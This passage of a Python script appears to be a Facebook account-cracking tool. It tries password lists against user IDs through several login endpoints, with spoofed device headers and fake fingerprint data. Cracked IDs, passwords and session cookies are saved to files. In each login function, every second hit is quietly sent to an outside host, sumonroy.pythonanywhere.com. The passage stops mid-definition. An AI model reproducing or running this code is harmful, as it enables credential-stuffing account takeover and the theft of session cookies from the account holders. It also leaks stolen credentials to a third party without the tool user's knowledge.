            'sec-ch-ua-platform': '"Android"',
            'accept': '*/*',
            'origin': 'https://m.facebook.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://m.facebook.com/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'fr_FR,fr;q=0.9'} 
            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            po = Session.post(url, data=data, headers=headers).text
            response = Session.cookies.get_dict().keys()
            if "c_user" in response:
                cok = Session.cookies.get_dict()
                cid = cok["c_user"]
                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                check = check_lock(cid)
                if "live" in check:
                    if '%3A-1%3A-1' in coki:
                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                        break
                    else:
                        bkas.append(cid)
                        if len(bkas)% 2 == 0:
                           statusok = (f"{cid}|{pw}|{coki}")
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                        else:
                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
                           print(f" {green}Cookie : {green}{coki}")
                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                           oks.append(cid)
                           break
                else:
                    break
            elif 'checkpoint' in response:
                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except ce:
        time.sleep(20)
    except Exception as error:
        #print({error})
        pass


def p(uid,pwx,tl):
    global loop
    global oks
    global cps
    sys.stdout.write(f"\r {green}(M2) ({loop}) (OK-{len(oks)}) \r"),
    sys.stdout.flush()
    try:
        for pw in pwx:
            data = {
    'method': 'post',
    'pretty': 'false',
    'format': 'json',
    'server_timestamps': 'true',
    'locale': '-',
    'purpose': 'fetch',
    'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
    'fb_api_caller_class': 'graphservice',
    'client_doc_id': '11994080424240083948543644217',
    'variables': json.dumps({
        "params": {
            "params": json.dumps({
                "client_input_params": json.dumps({
                    "sim_phones": [],
                    "secure_family_device_id": str(uuid.uuid4()),
                    "auth_secure_device_id": "",
                    "has_whatsapp_installed": 1,
                    "password": "#PWD_FB4A:0:{}:{}".format(int(time.time()), pw),
                    "sso_token_map_json_string": "",
                    "event_flow": "login_manual",
                    "sim_serials": [],
                    "client_known_key_hash": "",
                    "encrypted_msisdn": "",
                    "should_show_nested_nta_from_aymh": 0,
                    "device_id": str(uuid.uuid4()),
                    "login_attempt_count": 1,
                    "machine_id": "btqmzg6mx6h3dr2bnwn82yvj",
                    "flash_call_permission_status": json.dumps({
                        "READ_PHONE_STATE": "DENIED",
                        "READ_CALL_LOG": "DENIED",
                        "ANSWER_PHONE_CALLS": "DENIED"
                    }),
                    "accounts_list": [],
                    "family_device_id": str(uuid.uuid4()),
                    "fb_ig_device_id": [],
                    "device_emails": [],
                    "try_num": 3,
                    "lois_settings": json.dumps({
                        "lois_token": "",
                        "lara_override": ""
                    }),
                    "event_step": "home_page",
                    "headers_infra_flow_id": "",
                    "openid_tokens": {},
                    "contact_point": uid
                }),
                "server_params": json.dumps({
                    "should_trigger_override_login_2fa_action": 0,
                    "is_from_logged_out": 0,
                    "should_trigger_override_login_success_action": 0,
                    "login_credential_type": "none",
                    "server_login_source": "login",
                    "waterfall_id": str(uuid.uuid4()),
                    "login_source": "Login",
                    "is_platform_login": 0,
                    "pw_encryption_try_count": 1,
                    "INTERNALlatency_qpl_marker_id": 36707139,
                    "offline_experiment_group": "caa_iteration_v6_perf_fb_2",
                    "is_from_landing_page": 0,
                    "password_text_input_id": "5tm5yt:28",
                    "is_from_empty_password": 0,
                    "ar_event_source": "login_home_page",
                    "username_text_input_id": "zfiojk:27",
                    "layered_homepage_experiment_group": "",
                    "device_id": str(uuid.uuid4()),
                    "INTERNALlatency_qpl_instance_id": "0.7186605966306517",
                    "reg_flow_source": "login_home_native_integration_point",
                    "is_caa_perf_enabled": 1,
                    "credential_type": "password",
                    "is_from_password_entry_page": 0,
                    "caller": "gslr",
                    "family_device_id": str(uuid.uuid4()),
                    "INTERNAL_INFRA_THEME": "harm_f,default,harm_f",
                    "is_from_assistive_id": 0,
                    "access_flow_version": "F2_FLOW",
                    "is_from_logged_in_switcher": 0
                })
            }),
            "bloks_versioning_id": "c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722",
            "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
        },
        "scale": "47",
        "nt_context": json.dumps({
            "using_white_navbar": "True",
            "pixel_ratio": 3,
            "is_push_on": "False",
            "styles_id": "196702b4d5dfb9dbf1ded6d58ee42767",
            "bloks_version": "c459b951c037ad3fbe67f94342f309a73154e66c326b3cd823682078d9eeb722"
        })
    }),
    'fb_api_analytics_tags': '["GraphServices"]',
    'client_trace_id': str(uuid.uuid4())
}
            headers = {
    'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 9; GM1901 Build/SP1A.115640.652) [FBAN/FB4A;FBAV/517.0.0.70.92;FBBV/462428432;FBDM/{density=3.0,width=1080,height=2340};FBLC/tr_TR;FBRV/462428432;FBCR/Roshan;FBMF/OnePluse;FBBD/OnePluse;FBPN/com.facebook.katana;FBDV/GM1901;FBSV/9;FBCA/x86:x86_64;]',
    'accept-encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'authority': 'b-graph.facebook.com',
    'method': 'POST',
    'path': '/graphql',
    'scheme': 'https',
    'x-fb-ta-logging-ids': 'graphql:ddea93c5-33a6-4f43-aeeb-830b902836d8',
    'x-tigon-is-retry': 'True',
    'x-fb-device-group': '6487',
    'x-fb-connection-type': 'WIFI',
    'content-encoding': 'gzip',
    'x-fb-privacy-context': '3643298472347298',
    'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
    'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"2"},"application_tags":"graphservice"}',
    'x-graphql-client-library': 'graphservice',
    'x-fb-net-hni': '47004',
    'x-fb-sim-hni': '47004',
    'x-fb-background-state': '1',
    'x-graphql-request-purpose': 'fetch',
    'content-type': 'application/x-www-form-urlencoded',
    'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
    'x-fb-http-engine': 'Liger',
    'x-fb-client-ip': 'False',
    'x-fb-server-cluster': 'True'
}
            url = "https://graph.facebook.com/graphql?"
            result = requests.post(url, data=data, headers=headers).json()
            print(result)
            if "session_key" in result:
                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                coki = f"sb={sb};{ckkk}"
                try:
                    uid = result["uid"]
                except:
                    uid = uid
                c = check_lock(uid)
                if "live" in c:
                    if result["is_account_confirmed"] == False:
                        print(f" {cyan}[ATOM-NV] {uid}|{pw}")
                       #print(f" {green}[COOKIES] {green}{coki}")
                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                    else:
                        bkas.append(uid)
                        if len(bkas)% 2 == 0:
                           statusok = (f"{uid}|{pw}|{coki}")
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                        else:
                           print(f" {green}(ATOM-OK) {uid}|{pw} ")
                           print(f" {green}Cookie : {green}{coki}")
                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                           oks.append(uid)
                           break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except Exception as e:
        pass

def x(uid,pwx,tl):
    global oks
    global cps
    global twf
    global loop
    global bkas
    sys.stdout.write(f"\r {green}(M3) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
    sys.stdout.flush()
    try:
        for pw in pwx:
            nip=random.choice(xvx)
            proxs= {'http': nip}
            Session = requests.Session()
            free_fb = Session.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
            data = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'email': uid,
            'next': 'https://x.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified',
            'flow': 'login_no_pin',
            'pass': pw}
            headers = {
            'Host': 'm.prod.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'origin': 'https://m.prod.facebook.com',
            'content-type': 'application/x-www-form-urlencoded',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .17; WOW64)PQ1A)Applewebkit/537.36 (KHTML, like Gecko) Chrome/92.0.4934.52 Safari/537.36 Vivaldi/6.0.2979.18',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'dpr': '4',
            'viewport-width': '647',
            'sec-ch-ua': '"Not)A;Brand";v="12", "Chromium";v="100"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"9.0.0"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="17.0.0.0", "Chromium";v="106.0.5759.45"',
            'sec-ch-prefers-color-scheme': 'dark',
            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
            url = "https://m.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            po = Session.post(url, data=data, headers=headers).text
            response = Session.cookies.get_dict().keys()
            if "c_user" in response:
                cok = Session.cookies.get_dict()
                cid = cok["c_user"]
                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                check = check_lock(cid)
                if "live" in check:
                    if '%3A-1%3A-1' in coki:
                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                        break
                    else:
                        bkas.append(cid)
                        if len(bkas)% 2 == 0:
                           statusok = (f"{cid}|{pw}|{coki}")
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                        else:
                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
                           print(f" {green}Cookie : {green}{coki}")
                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                           oks.append(cid)
                           break
                else:
                    break
            elif 'checkpoint' in response:
                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except ce:
        time.sleep(20)
    except Exception as error:
        #print({error})
        pass

def mobile(uid,pwx,tl):
    global oks
    global cps
    global twf
    global loop
    global bkas
    sys.stdout.write(f"\r {green}(M4) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
    sys.stdout.flush()
    try:
        for pw in pwx:
            ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
            Session = requests.Session()
            free_fb = Session.get('https://touch.facebook.com/').text
            data = {
            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            'try_number': '0',
            'unrecognized_tries': '0',
            'email': uid,
            'prefill_contact_point': uid,
            'prefill_source': 'browser_dropdown',
            'prefill_type': 'contact_point',
            'first_prefill_source': 'browser_dropdown',
            'first_prefill_type': 'contact_point',
            'had_cp_prefilled': True,
            'had_password_prefilled': False,
            'is_smart_lock': False,
            'bi_xrwh': '0',
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
            headers = {
            'Host': 'mtouch.facebook.com',
            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
            'x-response-format': 'JSONStream',
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'viewport-width': '360',
            'x-requested-with': 'XMLHttpRequest',
            'x-asbd-id': '129477',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua-platform': '"Android"',
            'accept': '*/*',
            'origin': 'https://mtouch.facebook.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
            'sec-fetch-dest': 'empty',
            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
            url = "https://mtouch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            po = Session.post(url, data=data, headers=headers).text
            response = Session.cookies.get_dict().keys()
            if "c_user" in response:
                cok = Session.cookies.get_dict()
                cid = cok["c_user"]
                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                check = check_lock(cid)
                if "live" in check:
                    if '%3A-1%3A-1' in coki:
                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                        break
                    else:
                        bkas.append(cid)
                        if len(bkas)% 2 == 0:
                           statusok = (f"{cid}|{pw}|{coki}")
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                        else:
                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
                           print(f" {green}Cookie : {green}{coki}")
                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                           oks.append(cid)
                           break
                else:
                    break
            elif 'checkpoint' in response:
                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except ce:
        time.sleep(20)
    except Exception as error:
        #print({error})
        pass

def generate_shared_prefs_data():
    now = time.time()
    ts = lambda offset=0: round(now + offset + random.uniform(0.001, 0.999), 3)

    screen_sizes = [(720, 1280), (1080, 1920), (1440, 2560)]
    width, height = random.choice(screen_sizes)
    user_agents = [
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.60 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.101 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    ]
    ua = random.choice(user_agents)
    platform = "Android armv81" if "Android" in ua else "Linux x86_64"
    referrer = random.choice(["www.facebook.com", "touch.facebook.com", "m.facebook.com", "p.facebook.com"])
    battery_level = random.randint(5, 100)
    prefs = {
        "30000": [
            {"t": ts(), "ctx": {"cn": "https://www.facebook.com/"}, "v": False}
        ],
        "30001": [
            {"t": ts(1), "ctx": {"cn": "https://www.facebook.com/"}, "v": 0}
        ],
        "30005": [
            {"t": ts(2), "ctx": {"cn": "https://www.facebook.com/"}, "v": platform}
        ],
        "30009": [
            {"t": ts(3), "ctx": {"cn": "https://www.facebook.com/"}, "v": {"w": width, "h": height}}
        ],
        "30012": [
            {"t": ts(4), "ctx": {"cn": "https://www.facebook.com/"}, "v": referrer}
        ],
        "30015": [ 
            {"t": ts(5), "ctx": {"cn": "https://www.facebook.com/"}, "v": platform}
        ],
        "30018": [ 
            {"t": ts(6), "ctx": {"cn": "https://www.facebook.com/"}, "v": battery_level}
        ],
        "30093": [
            {"t": ts(7), "ctx": {"cn": "https://www.facebook.com/"}, "v": ua}
        ],
        "30100": [ 
            {"t": ts(8), "ctx": {"cn": "https://www.facebook.com/"}, "v": time.timezone // -60}
        ],
        "30110": [ 
            {"t": ts(9), "ctx": {"cn": "https://www.facebook.com/"}, "v": random.choice(["wifi", "cellular", "ethernet"])}
        ]
    }
    return base64.b64encode(json.dumps(prefs, separators=(",", ":")).encode()).decode()

def freeq(uid,pwx,tl):
    global oks
    global cps
    global twf
    global loop
    global bkas
    sys.stdout.write(f"\r {green}(M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
    sys.stdout.flush()
    try:
        for pw in pwx:
            ua = random.choice(uas)
            share = generate_shared_prefs_data()
            Session = requests.Session()
            free_fb = Session.get('https://m.facebook.com/').text
            cookies = Session.get('https://m.facebook.com/login/device-based/regular/login/', headers={ 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '1', 'origin': 'https://www.facebook.com', 'priority': 'u=0, i', 'referer': 'https://www.facebook.com/?ref=homescreenpwa', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.70", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"10.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0', 'viewport-width': '1440', }).cookies.get_dict()
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'email': uid,
            'cred_type': '100',
            'login_source': 'device_based_login_add_account',
            'is_reauth_from_account_switcher': '',
            'savepass': '',
            'next': '',
            'persistent': '',
            'shared_prefs_data': generate_shared_prefs_data(),
            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
            headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '2.75',
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
            'viewport-width': '980',}
            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
            url = "https://www.facebook.com/login/device-based/regular/login/"
            po = Session.post(url, data=data, cookies=cookies, headers=headers).text
            response = Session.cookies.get_dict().keys()
            if "c_user" in response:
                cok = Session.cookies.get_dict()
                cid = cok["c_user"]
                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                check = check_lock(cid)
                if "live" in check:
                    if '%3A-1%3A-1' in coki:
                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                        break
                    else:
                        bkas.append(cid)
                        if len(bkas)% 2 == 0:
                           statusok = (f"{cid}|{pw}|{coki}")
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                        else:
                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
                           print(f" {green}Cookie : {green}{coki}")
                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                           oks.append(cid)
                           break
                else:
                    break
            elif 'checkpoint' in response:
                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except ce:
        time.sleep(20)
    except Exception as error:
        print({error})
        pass

def d(uid,pwx,tl):
    global oks
    global cps
    global twf
    global loop
    global bkas
    sys.stdout.write(f"\r {green}(M6) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
    sys.stdout.flush()
    try:
        for pw in pwx:
            ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
            Session = requests.Session()
            free_fb = Session.get('https://m.facebook.com/').text
            cookies = {
            'datr': 'eL_uZ2Ty3h0loiAu7Is5kJfa',
            'sb': 'eL_uZ9ijCdro7wndMVgTyIBo',
            'ps_l': '1',
            'ps_n': '1',
            'vpd': 'v1%3B754x393x2.75',
            'locale': 'en_US',
            'wl_cbv': 'v2%3Bclient_version%3A2839%3Btimestamp%3A1749279032',
            'dpr': '3.0234789848327637',
            'm_pixel_ratio': '2.75',
            'wd': '393x895',
